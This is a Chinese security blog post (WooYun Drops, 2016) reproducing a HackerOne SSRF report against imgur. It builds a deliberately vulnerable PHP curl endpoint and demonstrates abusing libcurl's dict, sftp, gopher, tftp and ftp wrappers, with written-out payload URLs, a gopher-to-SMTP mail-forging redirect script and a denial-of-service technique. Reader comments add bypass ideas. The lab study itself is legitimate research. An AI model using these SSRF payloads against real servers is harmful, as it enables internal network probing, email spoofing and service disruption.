<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">SSRF libcurl protocol wrappers利用分析</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">小饼仔</a> <span class="bull">·</span> <time title="2016/03/21 10:29" ui-time="" datetime="2016/03/21 10:29" class="published ng-binding ng-isolate-scope">2016/03/21 10:29</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h2>0x00 概述</h2><hr><p>前几天在<a href="https://hackerone.com">hackerone</a>上看到一个<a href="http://imgur.com/">imgur</a>的<a href="https://hackerone.com/reports/115748">SSRF漏洞</a>，url为：<code>https://imgur.com/vidgif/url?url=xxx</code>，参数url没有做限制，可以访问内网地址。请求过程中使用到了liburl库，并且liburl配置不当，可以让攻击者使用除http(s)之外的多个libcurl protocol wrappers，比如<code>ftp://xxx.com/file</code>会让服务器发起ftp请求。</p><p>漏洞提交者<a href="https://hackerone.com/aesteral">aesteral</a>在报告中给出了几种协议的利用方法，查了下drops之前SSRF文章，好像没有专门介绍protocol wrappers，刚好看到了这个漏洞报告，就尝试着搭建环境复现下，记录下过程。</p><h2>0x01 环境搭建</h2><hr><p>首先要搭建php + nginx环境，来模拟SSRF server端漏洞环境，这里选择用<a href="http://www.docker.com/">docker</a>来搭建，系统为Ubuntu14.04，docker安装可以参考<a href="https://docs.docker.com/linux/step_one/">文档</a>，ubuntu的apt源建议换成<a href="http://wiki.ubuntu.org.cn/Template:14.04source">国内的</a>，安装起来比较快。</p><p>安装完后，拉取docker hub上安装好php + nginx环境的image，仓库在国外，速度可能略慢</p><p><code>docker pull richarvey/nginx-php-fpm</code></p><p>创建代码目录<code>/app</code></p><p>启动container(映射端口、挂载volume):</p><p><code>sudo docker run --name nginx -p 8084:80 -v /app:/usr/share/nginx/html -d richarvey/nginx-php-fpm</code></p><p>在/app目录下创建ssrf.php，代码中使用curl请求参数url对应的资源，返回给客户端，用于模拟SSRF的功能</p><pre><code>&lt;?php
        $url = $_GET['url'];
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_HEADER, false);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.1 Safari/537.11');
        // 允许302跳转
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        $res = curl_exec($ch);
        // 设置content-type
        header('Content-Type: image/png');
        curl_close($ch) ;
        //返回响应
        echo $res;
?&gt;
</code></pre><p>我们测试加载图片，访问</p><p><code>http://victim:8084/ssrf.php?url=http://download.easyicon.net/png/1199986/96/</code></p><p><a href="http://drops.wooyun.org/wp-content/uploads/2016/03/75B3CE55-D9FA-4F05-9B81-AE3385E9676A.jpg"><img alt="" title="75B3CE55-D9FA-4F05-9B81-AE3385E9676A" class="alignnone size-full wp-image-13957" img-src="2016031808183819379.jpg"></a></p><p>测试SSRF，在另一台机器上执行<code>nc -l -v 11111</code>，监听11111端口</p><p>访问 <code>http://victim:8084/ssrf.php?url=http://attacker:11111/</code></p><p><a href="http://drops.wooyun.org/wp-content/uploads/2016/03/D2479565-6067-49CF-B12B-E4EF2D77BCA3.jpg"><img alt="" title="D2479565-6067-49CF-B12B-E4EF2D77BCA3" class="alignnone size-full wp-image-13956" img-src="2016031808183850391.jpg"></a></p><h2>0x02 可利用的协议</h2><hr><p><strong>报告里给出的可利用的协议有</strong></p><ul><li>SSH (scp://, sftp://)</li><li>POP3</li><li>IMAP</li><li>SMTP</li><li>FTP</li><li>DICT</li><li>GOPHER</li><li>TFTP</li></ul><p>我们来看一下Ubuntu14.04下默认的libcurl支持哪些协议</p><p>因为docker ubuntu image没有curl，所以安装 <code>apt-get install -y curl</code></p><p>然后执行<code>curl -V</code></p><pre><code><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="a5d7cacad1e5d0c7d0cbd1d0">[email&#160;protected]</a>:/app# curl -V
curl 7.35.0 (x86_64-pc-linux-gnu) libcurl/7.35.0 OpenSSL/1.0.1f zlib/1.2.8 libidn/1.28 librtmp/2.3
Protocols: dict file ftp ftps gopher http https imap imaps ldap ldaps pop3 pop3s rtmp rtsp smtp smtps telnet tftp
Features: AsynchDNS GSS-Negotiate IDN IPv6 Largefile NTLM NTLM_WB SSL libz TLS-SRP
</code></pre><p>可以看到</p><pre><code>Protocols: dict file ftp ftps gopher http https imap imaps ldap ldaps pop3 pop3s rtmp rtsp smtp smtps telnet tftp
</code></pre><p>中，并没有SSH(scp://, sftp://)，所以默认是不支持的SSH协议的，需要自己下载源码重现编译安装，可以参考<a href="http://wiki.hetzner.de/index.php/Curl_fuer_sftp/en">这篇文章</a>。</p><h2>0x03 利用方式</h2><hr><p><strong>简单的利用，信息泄露</strong></p><p>利用SSH和DICT协议获取软件版本信息</p><p>sftp(需要curl编译安装libssh库)访问:<code>http://victim:8084/ssrf.php?url=sftp://attacker:11111/</code></p><p><a href="http://drops.wooyun.org/wp-content/uploads/2016/03/F90A5E0B-F339-40F7-A8DC-140FBCF3505C.jpg"><img alt="" title="F90A5E0B-F339-40F7-A8DC-140FBCF3505C" class="alignnone size-full wp-image-13954" img-src="2016031808183951780.jpg"></a></p><p>DICT访问 <code>http://victim:8084/ssrf.php?url=dict://attacker:11111/</code> <a href="http://drops.wooyun.org/wp-content/uploads/2016/03/F83A4EAE-C755-46AF-8BAC-6384B740859A.jpg"><img alt="" title="F83A4EAE-C755-46AF-8BAC-6384B740859A" class="alignnone size-full wp-image-13953" img-src="2016031808183981394.jpg"></a></p><p>可以看到服务使用的软件版本，<code>libssh2 1.4.3</code> 和 <code>libcurl 7.35.0</code>。查看下CVE</p><p><code>libssh2 1.4.3</code>可能受 CVE-2015-1782 影响</p><p>报告中imgur服务器中的软件版本是<code>libcurl 7.40.0</code> 可能受 CVE-2015-3144 和 CVE-2015-3237影响，我们的版本为<code>libcurl 7.35.0</code>，不受影响</p><hr><p><strong>利用GOPHER协议伪造发送邮件</strong></p><p>先介绍下GOPHER协议，来自百度知道～</p><p><code>Gopher协议是一种互联网没有发展起来之前的一种从远程服务器上获取数据的协议。Gopher协议目前已经很少使用，它几乎已经完全被HTTP协议取代了。</code></p><p>因为GOPHER协议支持newlines，所以可以用来发起类似TELNET chat-session的请求，比如SMTP，Redis server等。漏洞报告中提到imgur过滤了url参数中的newlines，但imgur server支持302跳转，所以可以构造一个302跳转的页面，结合GOPHER协议来完成攻击。</p><p>先测试一下GOPHER协议的效果，构造302跳转页面 gopher.php</p><pre><code>&lt;?php
header('Location: gopher://attacker:11111/_HI%0AMultiline%0Atest');
?&gt;
</code></pre><p>访问 <code>http://victim:8084/ssrf.php?url=http://attacker/gopher.php</code></p><p>attacker端：</p><p><a href="http://drops.wooyun.org/wp-content/uploads/2016/03/9BF07BD2-D848-4609-9C57-0D08087BA647.jpg"><img alt="" title="9BF07BD2-D848-4609-9C57-0D08087BA647" class="alignnone size-full wp-image-13952" img-src="2016031808183953884.jpg"></a></p><p>接下来是发送邮件，本来想用国内的邮箱试试的，然而都加了登陆验证来防止垃圾邮件。</p><p>报告中给了一个 http://test.smtp.org/ 的网站，可以用来测试，这里修改了收件人，不然不会发送成功</p><p>smtp.php:</p><pre><code>&lt;?php
        $commands = array(
                'HELO test.org',
                'MAIL FROM: &lt;<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="fb92969c8e89bb92969c8e89d5989496">[email&#160;protected]</a>&gt;',
                'RCPT TO: <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="f1819e82859c9082859483b185948285df829c8581df9e8396">[email&#160;protected]</a>',
                'DATA',
                'Test mail',
                '.'
        );

        $payload = implode('%0A', $commands);

        header('Location: gopher://smtp.163.com:25/_'.$payload);
?&gt;
</code></pre><p>访问<code>http://victim:8084/ssrf.php?url=http://attacker:8084/smtp.php</code></p><p>可以到 http://test.smtp.org/log 下查看日志，我的VPS连接不了 http://test.smtp.org的25端口，换来一台直接用TELNET模拟</p><pre><code><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="dca9bea9b2a8a99ca9bea9b2a8a9">[email&#160;protected]</a>:~$ telnet test.smtp.org 25
Trying 52.2.168.164...
Connected to test.smtp.org.
Escape character is '^]'.
220 test.smtp.org ESMTP Sendmail 8.16.0.16 ready at Fri, 18 Mar 2016 06:47:04 GMT; see http://test.smtp.org/
HELO test.org
250 test.smtp.org Hello [xx.xx.xx.xx], pleased to meet you
MAIL FROM: &lt;<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="177e7a706265577e7a7062653974787a">[email&#160;protected]</a>&gt;
250 2.1.0 &lt;<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="7f1612180a0d3f1612180a0d511c1012">[email&#160;protected]</a>&gt;... Sender ok
RCPT TO: <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="04746b777069657770617644706177702a776970742a6b7663">[email&#160;protected]</a>
250 2.1.5 <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="82f2edf1f6efe3f1f6e7f0c2f6e7f1f6acf1eff6f2acedf0e5ac">[email&#160;protected]</a>.. Recipient ok
DATA
354 Enter mail, end with "." on a line by itself
Test mail
.
250 2.0.0 u2I6l4QU017644 Message accepted for delivery
</code></pre><p>日志</p><p><a href="http://drops.wooyun.org/wp-content/uploads/2016/03/4303DD91-97BC-41C2-8037-D9C3CB6384D5.jpg"><img alt="" title="4303DD91-97BC-41C2-8037-D9C3CB6384D5" class="alignnone size-full wp-image-13951" img-src="2016031808184049375.jpg"></a></p><hr><p><strong>使用TFTP协议来发送UDP包</strong></p><p>服务端监听UDP 11111端口 <code>nc -v -u -l 11111</code></p><p>访问<code>http://Victim:8084/ssrf.php?url=tftp://Attacker:11111/TEST</code></p><p>Attacker: <a href="http://drops.wooyun.org/wp-content/uploads/2016/03/5E2AC53D-B859-41A3-8093-2ADD2674EB0A.jpg"><img alt="" title="5E2AC53D-B859-41A3-8093-2ADD2674EB0A" class="alignnone size-full wp-image-13950" img-src="2016031808184044868.jpg"></a></p><p>可以用来向UDP服务发起请求，比如Memcache 和 REDIS-UDP</p><hr><p><strong>Denial of service</strong></p><p>如果请求的超时时间较长，攻击者可以iptables的 TARPIT 来block请求，此外CURL的 FTP:// 永远不会超时</p><p>Attacker 监听 <code>nc -v -l 11111</code></p><p>访问 <code>http://Victim:8084/ssrf.php?url=ftp://Attacker:11111/TEST</code></p><p>nginx环境下默认超时时间为1分钟 <a href="http://drops.wooyun.org/wp-content/uploads/2016/03/C5A25D8D-1599-4E8B-83DB-EBCC7FB2051C.jpg"><img alt="" title="C5A25D8D-1599-4E8B-83DB-EBCC7FB2051C" class="alignnone size-full wp-image-13949" img-src="2016031808184110257.jpg"></a></p><p>攻击者可以发起大量请求来耗尽服务器的资源</p><h2>0x04 结论</h2><hr><p>撸站遇到SSRF时，除了可以使用http(s)之外，还有其它的一些协议，这里进行了简单的分析，希望对大家有一些帮助～</p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div id="donate" style="padding:10px;border-top:1px solid #d9d9d9;text-align:center"><span>碎银子打赏，作者好攒钱娶媳妇：</span><br><br><img src="http://static.wooyun.org/wooyun/upload/donate/20160325101543245a92728e13f23a463b7f3e1131a466.jpeg" style="width:200px;height:200px"></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">HackBraid</span> <span class="reply-time">2016-05-09 17:57:21</span></div><p></p><p>这分析，666</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">_Evil</span> <span class="reply-time">2016-03-22 15:42:32</span></div><p></p><p>wooyun:案例里面还有短URL地址绕过;还有http:<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="fdd2d28a8a8ad38a9292848893d3928f9abd9f9c949988d39e9290">[email&#160;protected]</a></p><p>还有什么16进制 base64编码的..</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">小饼仔</span> <span class="reply-time">2016-03-21 15:12:15</span></div><p></p><p>@xsser 代码丢上去应该就能跑</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">小饼仔</span> <span class="reply-time">2016-03-21 15:10:43</span></div><p></p><p>@PiaCa 666，我去试试，不过有些少年没有三个白帽账号，可以用这个试试。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">小饼仔</span> <span class="reply-time">2016-03-21 15:06:47</span></div><p></p><p>@猪猪侠 具体场景要复杂些，一般都会限定协议</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">小饼仔</span> <span class="reply-time">2016-03-21 15:04:15</span></div><p></p><p>@phith0n 快收集，坐等议题</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">PiaCa</span> <span class="reply-time">2016-03-21 14:41:50</span></div><p></p><p>少年，三个白帽直接起个 lamp，把代码拷贝上去就直接可以用了啊</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">xsser</span> <span class="reply-time">2016-03-21 14:29:30</span></div><p></p><p>环境在三个白帽里能用到么</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">猪猪侠</span> <span class="reply-time">2016-03-21 10:58:12</span></div><p></p><p>没有回显，协议限定只有HTTP的模式，相对会有些复杂</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">phith0n</span> <span class="reply-time">2016-03-21 10:43:34</span></div><p></p><p>http://drops.wooyun.org/web/9845<br>0x04 400 lalala (2 隊解)<br>利用gopher直接攻击fastcgi执行任意代码，之前准备了一个协议利用议题的，后来素材一直没准备齐</p><p></p></div></div></div></div></div></main>